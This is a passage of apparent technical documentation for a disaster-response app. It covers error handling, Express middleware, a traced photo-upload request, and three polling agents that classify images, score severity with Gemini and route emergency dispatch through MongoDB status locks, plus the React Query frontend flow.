  sendError(res, message, statusCode, details)
  
  Response: {
    success: false,
    error: {
      message: "File too large",
      details: "Maximum file size is 10MB"
    }
  }

Async Handler Wrapper:
  
  File: middleware/globalErrorHandler.js
  
  // Wraps async route handlers to catch Promise rejections
  export function asyncHandler(fn) {
    return (req, res, next) => {
      Promise.resolve(fn(req, res, next)).catch(next);
    };
  }
  
  // Usage in routes:
  router.post('/reports', asyncHandler(async (req, res) => {
    // Any thrown error or rejected promise is caught
    const report = await Report.create(req.body);
    sendSuccess(res, report, "Report created", 201);
  }));

Global Error Handler Middleware:
  
  // Catches all errors passed via next(error) or thrown
  export function errorHandler(err, req, res, next) {
    const statusCode = err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    
    // Log error (Winston in production)
    console.error(`[ERROR] ${err.name}: ${message}`);
    
    // Send structured response
    res.status(statusCode).json({
      success: false,
      error: {
        message,
        ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
      }
    });
  }

FRONTEND ERROR HANDLING:
~~~~~~~~~~~~~~~~~~~~~~~~

React Query Error Handling:
  
  File: frontend/src/pages/DashboardPage.jsx
  
  const { data, error, isLoading, isError } = useQuery({
    queryKey: ['reports'],
    queryFn: () => getReports(),
    retry: 2,  // Retry failed requests twice
    retryDelay: (attempt) => Math.min(1000 * 2 ** attempt, 30000)
  });
  
  // In render:
  if (isError) {
    return <ErrorMessage error={error.message} onRetry={refetch} />;
  }

Mutation Error Handling:
  
  const mutation = useMutation({
    mutationFn: (data) => createReport(data),
    onSuccess: () => {
      toast.success(t('report.created'));
      queryClient.invalidateQueries(['reports']);
    },
    onError: (error) => {
      toast.error(error.response?.data?.error?.message || t('error.generic'));
    }
  });

API Service Error Wrapping:
  
  File: frontend/src/services/apiService.js
  
  async function apiRequest(method, url, data) {
    try {
      const response = await axios({ method, url, data });
      return response.data;
    } catch (error) {
      // Transform axios error to consistent format
      const message = error.response?.data?.error?.message 
        || error.message 
        || 'Network error';
      
      throw new Error(message);
    }
  }

Error Boundary for Render Errors:
  
  File: frontend/src/components/ErrorBoundary.jsx
  
  class ErrorBoundary extends React.Component {
    state = { hasError: false, error: null };
    
    static getDerivedStateFromError(error) {
      return { hasError: true, error };
    }
    
    componentDidCatch(error, info) {
      // Log to monitoring service
      console.error('React Error:', error, info.componentStack);
    }
    
    render() {
      if (this.state.hasError) {
        return (
          <div className="error-page">
            <h1>Something went wrong</h1>
            <button onClick={() => window.location.reload()}>
              Reload Page
            </button>
          </div>
        );
      }
      return this.props.children;
    }
  }

Offline Error Handling:
  
  File: frontend/src/services/syncService.js
  
  async function uploadWithRetry(data, maxRetries = 3) {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      try {
        return await apiRequest('POST', '/reports', data);
      } catch (error) {
        if (!navigator.onLine) {
          // Save to IndexedDB for later sync
          await db.pendingReports.add({
            data,
            timestamp: Date.now(),
            retryCount: 0
          });
          throw new Error('Saved offline. Will sync when online.');
        }
        
        if (attempt === maxRetries) throw error;
        
        // Exponential backoff
        await delay(1000 * 2 ** attempt);
      }
    }
  }

ERROR CODES AND MESSAGES:
~~~~~~~~~~~~~~~~~~~~~~~~~
Common HTTP status codes used:

  200 OK                - Successful request
  201 Created           - Resource created (report, shelter, etc.)
  400 Bad Request       - Invalid input, missing fields
  401 Unauthorized      - Not logged in
  403 Forbidden         - Logged in but insufficient permissions
  404 Not Found         - Resource doesn't exist
  409 Conflict          - Duplicate resource, concurrent edit
  422 Unprocessable     - Valid syntax but semantic error
  429 Too Many Requests - Rate limited (Twilio, Gemini APIs)
  500 Internal Error    - Unexpected server error
  503 Service Unavailable - External service down
- Tracks alert status and responses

weatherService.js:
- Integrates with OpenWeatherMap API
- Caches weather data for 10 minutes
- getCurrentWeather(lat, lon)
- getWeatherAlerts(lat, lon)
- getWeatherForecast(lat, lon)

cloudinaryService.js:
- uploadImageBuffer(): Uploads images to Cloudinary
- Returns secure URLs for stored images

addressGeocodingService.js:
- Converts text addresses to coordinates
- Fallback regex parsing for location extraction

5.6 MIDDLEWARE
--------------
authMiddleware.js:
- requireAuth: Validates session or PIN header
- requireManager: Ensures manager role
- optionalAuth: Adds user if authenticated

globalErrorHandler.js:
- Catches all unhandled errors
- Logs to console with stack traces
- Returns standardized error responses

httpLogger.js:
- Logs incoming requests with method, path, status
- Uses Winston logger for structured output

MIDDLEWARE CHAIN EXECUTION ORDER:
---------------------------------
When a request arrives at the Express server, it passes through middleware
in this exact order:

1. CORS Middleware (cors)
   → Validates origin, sets Access-Control-Allow-* headers
   → If preflight OPTIONS request, responds immediately
   
2. Session Middleware (express-session)
   → Parses session cookie from request
   → Loads session data from MongoDB (connect-mongo)
   → Attaches req.session object
   
3. Body Parser (express.json)
   → Parses JSON request body
   → Attaches req.body object
   → Handles Content-Type: application/json
   
4. URL Encoded Parser (express.urlencoded)
   → Parses form data (x-www-form-urlencoded)
   → Used for Twilio webhooks and form submissions
   
5. Request Logger (httpLogger)
   → Logs: [2025-01-01 12:00:00] POST /api/reports 201 - 125ms
   → Only in development mode
   
6. Route-Specific Middleware:
   
   For protected routes:
   → requireAuth (authMiddleware.js)
     - Check session first
     - Fallback to x-auth-pin header
     - Attach req.user
   
   For manager-only routes:
   → requireManager (authMiddleware.js)
     - Same as requireAuth but checks role === "manager"
   
   For file uploads:
   → multer (imageUpload)
     - Parse multipart/form-data
     - Validate file type and size
     - Store in memory buffer
   
7. Route Handler (controller function)
   → Business logic execution
   → Database operations
   → Response sent
   
8. Error Handler (globalErrorHandler)
   → Catches any thrown errors
   → Logs stack trace
   → Sends error JSON response

REQUEST LIFECYCLE EXAMPLE:
--------------------------
POST /api/reports/photo (Upload photo report)

  Request:
  ┌─────────────────────────────────────────────────────────┐
  │ POST /api/reports/photo HTTP/1.1                        │
  │ Host: localhost:5000                                    │
  │ Content-Type: multipart/form-data; boundary=----xxx     │
  │ Cookie: connect.sid=s%3Axxx...                          │
  │ x-auth-pin: 1234                                        │
  │                                                         │
  │ ------xxx                                               │
  │ Content-Disposition: form-data; name="image"; filename="photo.jpg" │
  │ Content-Type: image/jpeg                                │
  │                                                         │
  │ [binary image data]                                     │
  │ ------xxx                                               │
  │ Content-Disposition: form-data; name="lat"              │
  │                                                         │
  │ 18.5204                                                 │
  │ ------xxx--                                             │
  └─────────────────────────────────────────────────────────┘

  Middleware Execution:
  ─────────────────────────────────────────────────────────────────────────
  
  1. CORS → ✓ Origin allowed
  
  2. Session → Load from MongoDB using connect.sid cookie
              → req.session = { userId: "...", userRole: "volunteer" }
  
  3. Body Parser → Skip (not JSON)
  
  4. URL Encoded → Skip (not form-urlencoded)
  
  5. Logger → [2025-01-01] POST /api/reports/photo
  
  6. Multer → Parse multipart/form-data
            → Validate: image/jpeg ✓
            → Validate: size < 10MB ✓
            → req.file = { buffer: <Buffer>, mimetype: "image/jpeg" }
            → req.body = { lat: "18.5204", lng: "73.8567", ... }
  
  7. Route Handler (server.js):
     → Validate: req.file exists ✓
     → Validate: lat/lng present ✓
     → Upload to Cloudinary → returns URL
     → Create Report in MongoDB
     → res.status(201).json({ success: true, ... })
  
  8. Response sent back to client
  ─────────────────────────────────────────────────────────────────────────

5.7 AI AGENTS SYSTEM
--------------------
Three background agents work as a pipeline:

SENTINEL AGENT (Python - sentinel_agent.py):
Purpose: Visual disaster detection from images

Technical Stack:
- TensorFlow/Keras for inference
- PyMongo for MongoDB access
- Pillow for image processing

POLLING CONFIGURATION:
  POLL_INTERVAL = 2 seconds
  MAX_CYCLES = 0 (infinite)
  
MONGODB QUERY FOR PENDING REPORTS:
  report = collection.find_one_and_update(
    {
      'status': 'Pending',
      'imageUrl': { '$ne': None, '$exists': True }
    },
    { '$set': { 'status': 'Processing_Visual' } },
    return_document=ReturnDocument.AFTER
  )
  
IMAGE PREPROCESSING PIPELINE:
  def preprocess_image(image):
    # Step 1: Resize to model input dimensions
    image = image.resize((224, 224))  # LANCZOS resampling
    
    # Step 2: Convert to RGB (handle RGBA, grayscale)
    if image.mode != 'RGB':
      image = image.convert('RGB')
    
    # Step 3: Convert to NumPy array
    image_array = np.array(image)  # shape: (224, 224, 3)
    
    # Step 4: Normalize pixel values to [0, 1]
    image_array = image_array / 255.0
    
    # Step 5: Add batch dimension
    image_array = np.expand_dims(image_array, axis=0)  # (1, 224, 224, 3)
    
    return image_array

CLASSIFICATION ALGORITHM:
  def classify_image(image_array):
    predictions = model.predict(image_array, verbose=0)
    
    # Binary classification (sigmoid output)
    if predictions.shape[-1] == 1:
      disaster_prob = float(predictions[0][0])
      if disaster_prob >= 0.5:
        class_name = 'Disaster'
        confidence = disaster_prob
      else:
        class_name = 'Non-Disaster'
        confidence = 1.0 - disaster_prob
    else:
      # Multi-class (softmax output)
      class_index = np.argmax(predictions[0])
      confidence = float(predictions[0][class_index])
      class_name = CLASS_NAMES[class_index]
    
    return class_name, confidence

CUSTOM F1 SCORE METRIC (Required for model loading):
  @tf.keras.utils.register_keras_serializable(package="Custom")
  class CustomF1Score(tf.keras.metrics.Metric):
    def __init__(self, name="f1_score", threshold=0.5, **kwargs):
      super().__init__(name=name, **kwargs)
      self.threshold = threshold
      self.true_positives = self.add_weight("tp", initializer="zeros")
      self.false_positives = self.add_weight("fp", initializer="zeros")
      self.false_negatives = self.add_weight("fn", initializer="zeros")
    
    def update_state(self, y_true, y_pred, sample_weight=None):
      y_pred = tf.cast(y_pred >= self.threshold, self.dtype)
      y_true = tf.cast(y_true, self.dtype)
      tp = tf.reduce_sum(y_true * y_pred)
      fp = tf.reduce_sum((1.0 - y_true) * y_pred)
      fn = tf.reduce_sum(y_true * (1.0 - y_pred))
      self.true_positives.assign_add(tp)
      self.false_positives.assign_add(fp)
      self.false_negatives.assign_add(fn)
    
    def result(self):
      precision = self.true_positives / (self.true_positives + self.false_positives)
      recall = self.true_positives / (self.true_positives + self.false_negatives)
      return 2 * precision * recall / (precision + recall)

ORACLE AGENT (Node.js - oracle_agent.js):
Purpose: AI-powered severity assessment

Technical Stack:
- Mongoose for MongoDB
- Gemini AI via geminiService.js

POLLING CONFIGURATION:
  POLL_INTERVAL = 3000ms
  MODEL = 'gemini-2.5-flash'

GEMINI PROMPT TEMPLATE:
  const REPORT_ANALYSIS_PROMPT = (report) => `
  You are a disaster response AI analyst. Analyze the following disaster report:
  
  The visual agent detected "${report.sentinelData?.tag}" with 
  ${(report.sentinelData?.confidence * 100).toFixed(1)}% confidence.
  The user text reported: "${report.text || 'No additional text provided'}"
  Location: Lat ${report.location?.lat}, Lng ${report.location?.lng}
  
  Return ONLY valid JSON in this exact format (no markdown, no code blocks):
  {
    "severity": <number from 1-10, where 10 is most severe>,
    "needs": [<array of strings like "Water", "Medical", "Rescue">],
    "summary": "<brief 1-2 sentence summary>"
  }`;

JSON PARSING AND VALIDATION:
  async function analyzeReport(report) {
    const result = await model.generateContent(prompt);
    const jsonText = result.response.text();
    
    // Parse JSON (may throw)
    const analysis = JSON.parse(jsonText);
    
    // Validate severity range
    if (analysis.severity < 1 || analysis.severity > 10) {
      analysis.severity = Math.max(1, Math.min(10, analysis.severity));
    }
    
    // Validate needs array
    if (!Array.isArray(analysis.needs)) {
      analysis.needs = ['Unknown'];
    }
    
    return analysis;
  }

LOGISTICS AGENT (Python - logistics_agent.py):
Purpose: Automated emergency dispatch and routing

Technical Stack:
- PyMongo for database
- Requests for OSRM API
- Haversine formula for distance calculations

POLLING CONFIGURATION:
  POLL_INTERVAL = 5 seconds
  STATIONS_CACHE_TTL = 60 seconds
  OSRM_BASE_URL = "https://router.project-osrm.org"

STATION TYPE MAPPING KEYWORDS:
  STATION_TYPE_KEYWORDS = [
    ("fire", "fire"),
    ("burn", "fire"),
    ("smoke", "fire"),
    ("blaze", "fire"),
    ("medical", "hospital"),
    ("injured", "hospital"),
    ("ambulance", "hospital"),
    ("heart", "hospital"),
    ("crime", "police"),
    ("theft", "police"),
    ("violence", "police"),
    ("robbery", "police"),
    ("trapped", "rescue"),
    ("flood", "rescue"),
    ("earthquake", "rescue"),
    ("collapse", "rescue"),
  ]

HAVERSINE DISTANCE CALCULATION:
  def haversine(lat1, lon1, lat2, lon2):
    """Calculate great-circle distance in meters."""
    R = 6371000  # Earth's radius in meters
    
    # Convert degrees to radians
    phi1 = math.radians(lat1)
    phi2 = math.radians(lat2)
    delta_phi = math.radians(lat2 - lat1)
    delta_lambda = math.radians(lon2 - lon1)
    
    # Haversine formula
    a = math.sin(delta_phi / 2) ** 2 + \
        math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda / 2) ** 2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
    
    return R * c  # Distance in meters

NEAREST STATION ALGORITHM:
  def find_nearest_station(location, station_type, stations_by_type):
    candidates = stations_by_type.get(station_type, [])
    
    if not candidates:
      # Fallback to rescue stations
      candidates = stations_by_type.get('rescue', [DEFAULT_DEPOT])
    
    min_distance = float('inf')
    nearest = None
    
    for station in candidates:
      dist = haversine(
        location['lat'], location['lon'],
        station['lat'], station['lon']
      )
      if dist < min_distance:
        min_distance = dist
        nearest = station
    
    return nearest, min_distance

OSRM ROUTE REQUEST:
  def get_osrm_route(waypoints, profile="driving"):
    """Get road-snapped route from OSRM."""
    # OSRM expects lon,lat format (reversed)
    coords_str = ";".join(
      f"{wp[1]},{wp[0]}" for wp in waypoints
    )
    
    url = f"{OSRM_BASE_URL}/route/v1/{profile}/{coords_str}"
    params = {
      "overview": "full",
      "geometries": "geojson",
      "steps": "false"
    }
    
    response = requests.get(url, params=params, timeout=10)
    data = response.json()
    
    if data.get("code") != "Ok":
      raise Exception(f"OSRM error: {data.get('code')}")
    
    route = data["routes"][0]
    
    return {
      "geometry": [
        {"lat": coord[1], "lon": coord[0]}
        for coord in route["geometry"]["coordinates"]
      ],
      "distance": route["distance"],  # meters
      "duration": route["duration"],  # seconds
    }

MISSION CREATION:
  def create_mission(db, report, station, route):
    missions_collection = db["missions"]
    
    mission = {
      "missionId": str(uuid.uuid4())[:8],
      "reportIds": [report["_id"]],
      "routes": route["geometry"],
      "stationId": station.get("id"),
      "stationName": station["name"],
      "stationType": station.get("type", "rescue"),
      "totalDistance": route["distance"],
      "duration": route["duration"],
      "status": "active",
      "createdAt": datetime.utcnow(),
    }
    
    missions_collection.insert_one(mission)
    return mission

================================================================================
5.8 COMPLETE REQUEST LIFECYCLE - TECHNICAL DEEP DIVE
================================================================================

This section traces a single HTTP request through every layer of the system,
showing exactly what code executes at each step.

EXAMPLE: POST /api/reports/photo (Upload Photo Report)
======================================================

STEP 1: AXIOS REQUEST (Frontend)
--------------------------------
File: frontend/src/services/apiService.js

  // User clicks "Submit" in PhotoReporter component
  async function uploadPhotoReport(imageFile, location, caption) {
    const formData = new FormData();
    formData.append('image', imageFile);
    formData.append('lat', location.lat);
    formData.append('lng', location.lng);
    formData.append('message', caption || '');
    formData.append('source', 'PWA');

    return await apiClient.post('/reports/photo', formData, {
      headers: { 'Content-Type': 'multipart/form-data' }
    });
  }

HTTP REQUEST GENERATED:
  POST /api/reports/photo HTTP/1.1
  Host: localhost:5000
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
  Cookie: connect.sid=s%3Axxxxx...
  x-auth-pin: 1234
  
  ------WebKitFormBoundary7MA4YWxk
  Content-Disposition: form-data; name="image"; filename="photo.jpg"
  Content-Type: image/jpeg
  
  [BINARY IMAGE DATA]
  ------WebKitFormBoundary7MA4YWxk
  Content-Disposition: form-data; name="lat"
  
  18.5204
  ------WebKitFormBoundary7MA4YWxk--

STEP 2: EXPRESS MIDDLEWARE CHAIN
--------------------------------
File: backend/server.js

Request passes through middleware in this exact order:

  2a. CORS CHECK:
      app.use(cors({...}));
      // Validates Origin header, adds Access-Control-Allow-* headers
      // If preflight (OPTIONS), responds immediately
  
  2b. SESSION LOADING:
      app.use(session({...}));
      // Parses connect.sid cookie
      // Loads session from MongoDB: { userId: "...", userRole: "volunteer" }
      // Attaches req.session object
  
  2c. BODY PARSERS (Skip for multipart):
      app.use(express.json());
      // Skipped: Content-Type is multipart/form-data, not application/json
  
  2d. REQUEST LOGGER:
      app.use(requestLogger);
      // Logs: [2026-01-01 12:00:00] POST /api/reports/photo
      // Records start time for duration calculation
  
  2e. ROUTE MATCHING:
      app.use('/api', apiRouter);
      // Matches /api prefix, strips it, passes to router

STEP 3: MULTER FILE PARSING
---------------------------
File: backend/server.js

  const imageUpload = multer({
    storage: multer.memoryStorage(),  // Store in RAM as Buffer
    limits: { fileSize: 10 * 1024 * 1024 },  // 10MB max
    fileFilter: (req, file, cb) => {
      const allowed = ['image/jpeg', 'image/png', 'image/webp', 'image/heic'];
      if (allowed.includes(file.mimetype)) {
        cb(null, true);   // Accept file
      } else {
        cb(new Error('Invalid file type'), false);  // Reject
      }
    }
  });

After Multer processes:
  req.file = {
    fieldname: 'image',
    originalname: 'photo.jpg',
    mimetype: 'image/jpeg',
    buffer: <Buffer ff d8 ff e0 00 10 ...>,  // Raw bytes
    size: 1234567
  };
  req.body = {
    lat: '18.5204',      // Still strings!
    lng: '73.8567',
    message: 'Fire visible',
    source: 'PWA'
  };

STEP 4: ROUTE HANDLER EXECUTION
-------------------------------
File: backend/server.js

  app.post("/api/reports/photo", 
    imageUpload.single("image"),  // Multer first
    async (req, res) => {         // Then handler
      
      // 4a. VALIDATION
      if (!req.file) {
        return res.status(400).json({
          success: false,
          message: "Image is required"
        });
      }
      
      const lat = parseFloat(req.body.lat);
      const lng = parseFloat(req.body.lng);
      
      if (isNaN(lat) || isNaN(lng)) {
        return res.status(400).json({
          success: false,
          message: "Valid coordinates required"
        });
      }
      
      // 4b. CLOUDINARY UPLOAD
      const uploadResult = await uploadImageBuffer(req.file.buffer, {
        folder: 'disaster-response/reports/photos'
      });
      // uploadResult = { url: "https://res.cloudinary.com/...", ... }
      
      // 4c. CREATE REPORT IN MONGODB
      const report = new Report({
        reportId: uuidv4(),
        source: req.body.source || 'PWA',
        text: req.body.message || null,
        imageUrl: uploadResult.url,
        location: { lat, lng },
        status: 'Pending',  // Triggers AI pipeline
        timestamp: new Date()
      });
      
      const saved = await report.save();
      
      // 4d. SEND RESPONSE
      res.status(201).json({
        success: true,
        message: 'Report submitted successfully',
        data: {
          reportId: saved.reportId,
          id: saved._id,
          status: saved.status
        }
      });
    }
  );

STEP 5: MONGODB WRITE OPERATION
-------------------------------
  
  // Mongoose .save() does:
  // 1. Validates against schema
  // 2. Applies defaults (timestamps, UUID)
  // 3. Converts to BSON
  // 4. Sends to MongoDB driver
  // 5. Driver sends insert command to MongoDB
  
  // MongoDB wire protocol:
  // OP_MSG with insert command to 'reports' collection
  
  // MongoDB acknowledges write:
  { ok: 1, n: 1 }

STEP 6: RESPONSE SENT
---------------------
  
  HTTP/1.1 201 Created
  Content-Type: application/json
  Set-Cookie: connect.sid=s%3Axxxxx...; Path=/; HttpOnly
  
  {
    "success": true,
    "message": "Report submitted successfully",
    "data": {
      "reportId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
      "id": "507f1f77bcf86cd799439011",
      "status": "Pending"
    }
  }

STEP 7: FRONTEND RECEIVES RESPONSE
----------------------------------
  
  // Back in apiService.js
  const response = await apiClient.post('/reports/photo', formData);
  // response.data = { success: true, message: "...", data: {...} }
  
  // React Query mutation onSuccess callback
  queryClient.invalidateQueries(['reports']);
  toast.success(t('report.submitted'));

STEP 8: AI AGENT DETECTS NEW REPORT
-----------------------------------

Within 2 seconds, Sentinel Agent polls MongoDB:

  # sentinel_agent.py
  while True:
      report = collection.find_one_and_update(
          {
              'status': 'Pending',
              'imageUrl': {'$ne': None, '$exists': True}
          },
          {'$set': {'status': 'Processing_Visual'}},
          return_document=ReturnDocument.AFTER
      )
      
      if report:
          # Found our new report!
          process_report(report)
      
      time.sleep(2)

The report is now locked and processing begins...

COMPLETE REQUEST TIMELINE:
--------------------------
  
  T+0ms     User clicks Submit
  T+5ms     FormData built, axios.post() called
  T+10ms    TCP connection established (if not reused)
  T+15ms    HTTP request sent
  T+20ms    Express receives, CORS check
  T+25ms    Session loaded from MongoDB
  T+30ms    Multer parses multipart form
  T+100ms   Image buffer extracted
  T+150ms   Cloudinary upload starts
  T+2000ms  Cloudinary upload completes
  T+2050ms  MongoDB insert starts
  T+2100ms  MongoDB write acknowledged
  T+2120ms  JSON response sent
  T+2150ms  Frontend receives response
  T+2160ms  Toast notification shown
  T+2170ms  React Query cache invalidated
  T+4000ms  Sentinel Agent finds report
  T+6000ms  TensorFlow inference complete
  T+7000ms  Oracle Agent processes
  T+10000ms Gemini API responds
  T+15000ms Logistics Agent creates mission
  T+16000ms Emergency station alerted

================================================================================
5.9 AGENT INTER-PROCESS COMMUNICATION
================================================================================

The three AI agents are separate OS processes that communicate through MongoDB.
This section explains how they coordinate without race conditions.

PROCESS ISOLATION:
------------------

  Main Node.js Process (server.js)
            │
            ├── spawn('node', ['oracle_agent.js'])  → Oracle Process (PID: 1234)
            │       └── MongoDB connection (separate)
            │
            ├── spawn('python', ['sentinel_agent.py']) → Sentinel Process (PID: 1235)
            │       └── MongoDB connection (separate)
            │
            └── spawn('python', ['logistics_agent.py']) → Logistics Process (PID: 1236)
                    └── MongoDB connection (separate)

Each process has:
  - Separate memory space
  - Own MongoDB connection pool
  - Own event loop
  - Stdout/stderr piped to parent

ATOMIC LOCKING MECHANISM:
-------------------------

Problem: Multiple agents might try to process the same report.

Solution: MongoDB's findOneAndUpdate is ATOMIC.

  // Sentinel Agent attempts to claim a report
  report = db.reports.findOneAndUpdate(
      { status: 'Pending', imageUrl: { $exists: true } },  // Query
      { $set: { status: 'Processing_Visual' } },           // Update
      { returnDocument: 'after' }                          // Options
  );

What happens at MongoDB level:
  1. MongoDB acquires document-level lock
  2. Finds document matching query
  3. Applies update atomically
  4. Returns updated document
  5. Releases lock

If two agents call simultaneously:
  - Agent A: Finds document, changes status to Processing_Visual
  - Agent B: Query fails (status no longer 'Pending')
  - Agent B receives null, moves on

STATUS STATE TRANSITIONS:
-------------------------

  ┌─────────────────────────────────────────────────────────────────────────┐
  │                    AGENT COORDINATION VIA STATUS                         │
  ├─────────────────────────────────────────────────────────────────────────┤
  │                                                                          │
  │   Report Created                                                         │
  │   status: "Pending"                                                      │
  │        │                                                                 │
  │        │ Sentinel claims: status → "Processing_Visual"                   │
  │        ▼                                                                 │
  │   ┌───────────────────┐                                                  │
  │   │ SENTINEL WORKING  │  (Oracle ignores: status != 'Analyzed_Visual')  │
  │   │ - Download image  │  (Logistics ignores: no oracleData)             │
  │   │ - TF inference    │                                                  │
  │   └─────────┬─────────┘                                                  │
  │             │                                                            │
  │             │ Sentinel completes: status → "Analyzed_Visual"             │
  │             ▼                                                            │
  │   ┌───────────────────┐                                                  │
  │   │  ORACLE CLAIMS    │  (Sentinel ignores: status != 'Pending')        │
  │   │  status →         │  (Logistics ignores: no oracleData.severity)    │
  │   │  "Processing_Oracle"│                                                │
  │   └─────────┬─────────┘                                                  │
  │             │                                                            │
  │             │ Oracle completes: status → "Analyzed_Full"                 │
  │             │ oracleData: { severity: 8, needs: [...] }                  │
  │             ▼                                                            │
  │   ┌───────────────────┐                                                  │
  │   │ LOGISTICS CLAIMS  │  (Sentinel: done, ignores)                       │
  │   │ severity > 0      │  (Oracle: done, ignores)                         │
  │   │ Creates mission   │                                                  │
  │   └─────────┬─────────┘                                                  │
  │             │                                                            │
  │             │ Logistics completes: dispatch_status → "Assigned"          │
  │             ▼                                                            │
  │   ┌───────────────────┐                                                  │
  │   │  MISSION ACTIVE   │                                                  │
  │   │  Alert sent to    │                                                  │
  │   │  emergency station│                                                  │
  │   └───────────────────┘                                                  │
  │                                                                          │
  └─────────────────────────────────────────────────────────────────────────┘

AGENT QUERY PATTERNS:
---------------------

Sentinel Agent (finds NEW image reports):
  { status: 'Pending', imageUrl: { $ne: null, $exists: true } }

Oracle Agent (finds SENTINEL-PROCESSED reports):
  {
    $or: [
      { status: 'Analyzed_Visual' },
      { status: 'Processing_Audio' }
    ],
    'oracleData.severity': null  // Not yet analyzed
  }

Logistics Agent (finds HIGH-SEVERITY reports):
  {
    'oracleData.severity': { $gt: 0 },  // Has severity score
    $or: [
      { dispatch_status: { $exists: false } },
      { dispatch_status: 'Unassigned' }
    ]
  }

ERROR RECOVERY:
---------------

If an agent crashes mid-processing:
  - Report stuck in "Processing_X" state
  - On restart, agent could be modified to handle:
    
    // Find stuck reports (processing for > 5 minutes)
    {
      status: 'Processing_Visual',
      updatedAt: { $lt: new Date(Date.now() - 5 * 60 * 1000) }
    }
    
    // Reset to Pending for retry
    { $set: { status: 'Pending' } }

Currently not implemented - manual intervention required.

================================================================================
                       6. FRONTEND IMPLEMENTATION
================================================================================

6.0 COMPLETE FRONTEND DATA FLOW ARCHITECTURE
---------------------------------------------

This section provides an end-to-end understanding of how data flows through
the React application, from user interaction to API calls and back.

┌─────────────────────────────────────────────────────────────────────────────┐
│                    FRONTEND ARCHITECTURE DEEP DIVE                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   USER INTERACTION                                                           │
│   ════════════════                                                           │
│        │                                                                     │
│        ▼                                                                     │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                      REACT COMPONENT LAYER                           │   │
│   │                                                                      │   │
│   │   ┌─────────────┐   ┌─────────────┐   ┌─────────────┐               │   │
│   │   │ DashboardPage│   │ VolunteerPage│  │ ResourcesPage│              │   │
│   │   │  (Manager)  │   │  (Volunteer) │   │  (Manager)  │              │   │
│   │   └──────┬──────┘   └──────┬──────┘   └──────┬──────┘               │   │
│   │          │                 │                 │                       │   │
│   │          └─────────────────┼─────────────────┘                       │   │
│   │                           ▼                                          │   │
│   │   ┌─────────────────────────────────────────────────────────────┐   │   │
│   │   │                   SHARED COMPONENTS                          │   │   │
│   │   │  Map.jsx | MapPin.jsx | RouteLine.jsx | TaskList.jsx        │   │   │
│   │   │  AudioReporter.jsx | PhotoReporter.jsx | SyncStatus.jsx     │   │   │
│   │   └─────────────────────────────────────────────────────────────┘   │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                       HOOKS & STATE LAYER                            │   │
│   │                                                                      │   │
│   │   React Query (Server State)    React Context (Client State)        │   │
│   │   ─────────────────────────     ────────────────────────────        │   │
│   │   useQuery(['reports'])         useAuth() → user, isManager          │   │
│   │   useQuery(['missions'])        useAccessibility() → fontSize        │   │
│   │   useMutation(createReport)     useVolunteerRoute() → activeRoute   │   │
│   │                                                                      │   │
│   │   useState (Local Component)                                         │   │
│   │   ────────────────────────                                           │   │
│   │   selectedReportId, isModalOpen, formValues                         │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                       SERVICE LAYER                                  │   │
│   │                                                                      │   │
│   │   apiService.js          authService.js        syncService.js       │   │
│   │   ─────────────          ──────────────        ─────────────        │   │
│   │   getReports()           loginWithPin()        syncPending()        │   │
│   │   createReport()         logout()              initListeners()      │   │
│   │   getMissions()          checkSession()                              │   │
│   │                                                                      │   │
│   │   emergencyStationService.js    db.js (Dexie/IndexedDB)             │   │
│   │   ──────────────────────────    ───────────────────────              │   │
│   │   getAllStations()              pendingVerifications                 │   │
│   │   registerStation()             offlineReports                       │   │
│   │   dispatchAlert()               mapTiles                             │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                    ┌───────────────┴───────────────┐                       │
│                    ▼                               ▼                        │
│   ┌────────────────────────────┐   ┌────────────────────────────┐          │
│   │      AXIOS (Online)         │   │   IndexedDB (Offline)      │          │
│   │   POST /api/reports         │   │   db.pendingVerifications  │          │
│   │   GET /api/missions         │   │   db.offlineReports        │          │
│   └────────────────────────────┘   └────────────────────────────┘          │
│                    │                               │                        │
│                    ▼                               ▼                        │
│            Express Backend              Auto-sync when online               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘

REACT QUERY LIFECYCLE EXPLAINED:
--------------------------------

  // Step 1: Component requests data
  const { data, isLoading, error, refetch } = useQuery({
    queryKey: ['reports', { status: 'Pending' }],
    queryFn: () => getReports({ status: 'Pending' }),
    staleTime: 5000,        // Consider fresh for 5 seconds
    cacheTime: 5 * 60000,   // Keep in cache for 5 minutes
    refetchOnWindowFocus: true,
    refetchInterval: 30000  // Auto-refetch every 30 seconds
  });

  // Step 2: React Query checks cache
  // Cache key: ['reports', { status: 'Pending' }]
  
  // Step 3a: CACHE HIT + FRESH
  // → Return cached data immediately, no network request
  
  // Step 3b: CACHE HIT + STALE
  // → Return cached data immediately
  // → Background refetch to update cache
  // → Re-render with new data when received
  
  // Step 3c: CACHE MISS
  // → isLoading = true
  // → Make network request
  // → Store in cache, return data

MUTATION WITH OPTIMISTIC UPDATE:
--------------------------------

  const mutation = useMutation({
    mutationFn: (data) => createReport(data),
    
    // Optimistic update BEFORE server responds
    onMutate: async (newReport) => {
      // Cancel in-flight refetches
      await queryClient.cancelQueries(['reports']);
      
      // Snapshot current state
      const previousReports = queryClient.getQueryData(['reports']);
      
      // Optimistically add new report
      queryClient.setQueryData(['reports'], old => [...old, {
        ...newReport,
        id: 'temp-' + Date.now(),
        status: 'Pending'
      }]);
      
      // Return context for rollback
      return { previousReports };
    },
    
    // On success: invalidate to refetch
    onSuccess: () => {
      queryClient.invalidateQueries(['reports']);
      toast.success('Report submitted');
    },
    
    // On error: rollback to snapshot
    onError: (err, newReport, context) => {
      queryClient.setQueryData(['reports'], context.previousReports);
      toast.error('Failed to submit report');
    }
  });

CONTEXT PROVIDER PATTERN:
-------------------------

  // AuthProvider wraps entire app
  export function AuthProvider({ children }) {
